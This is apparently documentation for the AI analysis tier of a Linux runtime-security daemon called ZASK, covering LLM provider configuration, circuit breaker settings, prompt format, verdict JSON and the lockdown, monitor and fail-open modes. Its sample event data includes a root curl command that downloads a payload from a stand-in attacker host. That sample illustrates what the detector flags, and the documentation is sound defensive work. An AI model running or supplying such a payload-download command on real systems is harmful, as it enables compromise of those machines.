# AI Integration Guide

ZASK's Tier 3 Semantic Reasoning Layer uses an LLM to analyze suspicious binary executions that pass through Tier 1 (kernel map lookup) and Tier 2 (CEL rule engine) without a definitive verdict. This document covers supported providers, configuration, prompt engineering, and operational guidance.

Short summary:
- **Disabling Tier 3:** Leave `providerUrl` empty. The daemon runs with Tier 1 + Tier 2 only (no LLM analysis).
- **Queue overflow:** When the queue is full, new events are dropped with a warning log. Tune `queueSize` and `workers` based on event throughput.
- **Monitor mode:** In monitor mode (`spec.mode: monitor`), AI verdicts are logged but never enforced — no `SIGKILL` or verdict map writes. See the [Feedback Loop](#feedback-loop) section for details.
- **Observability:** The worker pool exposes queue depth, processed count, and circuit breaker state for Prometheus integration (Phase 4).

The plans are to implement the ONNX-based embedded ML tier, which will sit between Tier 2 and current Tier 3. The ONNX tier should provide a fast, local inference path for common patterns, while the LLM handles complex or novel cases that require deep semantic understanding.

## Supported Providers

ZASK communicates with any **OpenAI-compatible chat completion API** `https://api.openai.com/v1/chat/completions`. It must accept `POST` with `model`, `messages`, `temperature` fields 

The provider must return responses in the standard OpenAI chat completion format with a `choices[0].message.content` field containing the verdict JSON.

## Configuration Reference

Add an `ai` section under `spec` in your ZASK config file:

```yaml
apiVersion: zask.io/v1alpha1
kind: ZaskConfig
spec:
  ai:
    providerUrl: "http://localhost:11434/v1/chat/completions"
    model: "llama3"
    apiKeyEnv: "ZASK_AI_API_KEY"        # Environment variable containing the API key
    apiKeyFile: "/etc/zask/ai-key"      # Fallback: file containing the API key
    riskThreshold: 0.85                 # Risk score above which events are blocked
    timeout: 5s                         # Per-request HTTP timeout
    maxRetries: 3                       # Retry count for transient failures
    workers: 4                          # Concurrent AI analysis goroutines
    queueSize: 256                      # Event queue capacity
    failOpen: true                      # Allow execution on AI failure
    systemPrompt: ""                    # Override the default SOC analyst prompt
    circuitBreaker:
      maxFailures: 5                    # Consecutive failures before opening
      cooldownTime: 30s                 # Time before probing recovery
      halfOpenMaxReqs: 1                # Probe requests in half-open state
```

### Field Reference

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `providerUrl` | string | *(none)* | AI provider endpoint URL. If empty, Tier 3 is disabled. |
| `model` | string | *(none)* | Model identifier (e.g., `gpt-4o`, `llama3`, `mistral`). |
| `apiKeyEnv` | string | *(none)* | Environment variable name containing the API key. |
| `apiKeyFile` | string | *(none)* | Path to a file containing the API key (fallback if env var is empty). |
| `riskThreshold` | float64 | `0.85` | Risk score in [0.0, 1.0] above which the verdict is BLOCK. |
| `timeout` | duration | `5s` | HTTP timeout per AI request. |
| `maxRetries` | int | `3` | Number of retry attempts for transient errors (5xx, timeouts). |
| `workers` | int | `4` | Number of concurrent goroutines processing the AI queue. |
| `queueSize` | int | `256` | Capacity of the in-memory event queue. Events are dropped when full. |
| `failOpen` | bool | `true` | If `true`, execution is allowed when AI analysis fails. If `false`, the process is killed on failure. |
| `systemPrompt` | string | *(built-in)* | Override the default system prompt sent to the LLM. |

### Circuit Breaker

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `maxFailures` | int | `5` | Consecutive failures before the circuit opens. |
| `cooldownTime` | duration | `30s` | Time to wait before transitioning from open to half-open. |
| `halfOpenMaxReqs` | int | `1` | Number of probe requests allowed in half-open state. |

The circuit breaker uses [sony/gobreaker](https://github.com/sony/gobreaker) and follows the three-state pattern:

- **Closed** — Normal operation. Failures are counted.
- **Open** — Provider is considered unavailable. All requests short-circuit with the configured fail mode.
- **Half-open** — After cooldown, a limited number of probe requests are sent. Success closes the circuit; failure re-opens it.

## Prompt Template

ZASK uses a two-message prompt structure:

### System Message

The default system prompt instructs the LLM to act as a SOC analyst and return structured JSON. Original prompt can be found in `internal/ai/prompt.go`.

Override this via the `systemPrompt` configuration field.

### User Message

The user message contains the execution event data wrapped in delimiters to prevent prompt injection:

```
Analyze the following binary execution event for security threats:

<<<EVENT_DATA>>>
User: root (UID 0)
Command: /usr/bin/curl -o /tmp/payload https://evil.example.com/shell
Parent: nginx
Parent Command: /usr/sbin/nginx -g daemon off;
Service: /system.slice/nginx.service
<<<END_EVENT_DATA>>>
```

All event data is sanitized before inclusion in the prompt to mitigate prompt injection risks.

## Authentication

API key resolution follows this priority:

1. **Environment variable** — The value of the variable named in `apiKeyEnv` (e.g., `ZASK_AI_API_KEY`).
2. **Key file** — The contents of the file at `apiKeyFile`, trimmed of whitespace.
3. **No authentication** — If both are empty/unset, requests are sent without an `Authorization` header (suitable for local providers like Ollama).

The API key is sent as a `Bearer` token in the `Authorization` header.

## Verdict Format

The AI must return a JSON object with exactly two fields:

```json
{"risk": 0.85, "reasoning": "Process attempts to download a remote payload as root"}
```

| Field | Type | Constraints |
|-------|------|-------------|
| `risk` | float64 | Must be in [0.0, 1.0]. |
| `reasoning` | string | Must be non-empty. |

Responses with unknown fields, out-of-range values, or malformed JSON are rejected and treated as failures.

## Feedback Loop

The feedback loop behavior depends on the daemon's operational mode (`spec.mode`):

### Lockdown Mode (default)

When a verdict exceeds the risk threshold:

1. The binary's inode is written to the eBPF verdict map as `BLOCK`.
2. `SIGKILL` is sent to the process.
3. An audit event is emitted with model name, risk score, and reasoning.

When the verdict is below the threshold, execution continues and an `ALLOW` audit event is emitted.

### Monitor Mode

When `spec.mode: monitor`, AI verdicts are **logged but never enforced**:

1. The verdict is logged with model name, risk score, and reasoning.
2. An audit event is emitted (identical to lockdown mode).
3. **No `SIGKILL` is sent** — the process continues running.
4. **No verdict map write** — the eBPF layer is not updated.

This allows operators to evaluate AI accuracy before enabling enforcement.

### AI Unavailable (Fail Mode)

When the AI provider is unreachable, the circuit breaker is open, or analysis fails, the `failOpen` setting controls behavior:

| `failOpen` | Behavior |
|------------|----------|
| `true` (default) | Execution is **allowed** — the event is treated as ALLOW. |
| `false` | The process is **killed** (`SIGKILL`) — fail-closed enforcement. |

When the AI provider is not configured at all (`providerUrl` empty), Tier 3 is disabled entirely and events that pass Tier 1 and Tier 2 without a match default to `ALLOW`.

